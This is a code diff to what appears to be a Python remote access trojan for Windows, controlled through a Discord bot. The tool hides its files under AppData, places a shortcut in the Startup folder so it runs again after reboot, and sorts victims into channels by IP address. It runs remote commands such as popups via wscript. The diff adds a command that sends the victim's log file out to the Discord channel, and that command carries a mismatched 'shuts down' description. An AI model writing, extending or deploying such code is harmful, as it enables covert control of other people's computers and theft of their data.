@@ -37,7 +37,8 @@ user_profile = os.environ['USERPROFILE']
 target_path = os.path.join(user_profile, 'AppData', 'Roaming', 'Microsoft', 'Windows')
 os.makedirs(target_path, exist_ok=True)
 
-sys.stdout = open(os.path.join(target_path, "skibidi-mainmain", "log.txt"), "w")
+sys.stdout = open(os.path.join(target_path, "skibidi-mainmain", "log.txt"), "a", buffering=1)  # "a" = append mode, "buffering=1" = line buffering
+sys.stderr = sys.stdout
 
 startup_dir = Path(os.getenv("APPDATA")) / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup"
 shortcut_name="MyPythonScript"
@@ -127,12 +128,10 @@ path_to_cursor = os.path.join(target_path, 'skibidi-mainmain', 'cursor', 'cursor
 cursor_image = Image.open(path_to_cursor)
 cursor_width, cursor_height = 16, 16
 
+intents1 = nextcord.Intents.default()
+intents1.message_content = True
 
-
-client = commands.Bot(command_prefix = '!', intents=nextcord.Intents.default())
-
-intents = nextcord.Intents.default()
-intents.message_content = True
+client = commands.Bot(command_prefix = '!', intents=intents1)
 
 
 @client.event
@@ -486,6 +485,17 @@ async def popup(interaction : Interaction, message: str, window_title: Optional[
         subprocess.Popen(["wscript", os.path.join(target_path, "skibidi-mainmain", "popup", "popup.vbs")], shell=True)
         
         await interaction.response.send_message(f"Popup window succesfully opened with message: {message}")
+
+@client.slash_command(guild_ids=testServerId, description="Shuts down the client's computer.")
+async def output_log(interaction : Interaction):
+    category = interaction.channel.category
+    if str(category) == str(ip):
+        await interaction.response.send_message("Sending log file...")
+        user_profile = os.environ['USERPROFILE']
+        target_path = os.path.join(user_profile, 'AppData', 'Roaming', 'Microsoft', 'Windows')
+        log_path = os.path.join(target_path, "skibidi-mainmain", "log.txt")
+        file1 = nextcord.File(log_path, filename='log.txt')
+        await interaction.send(file=file1)
 
 
 
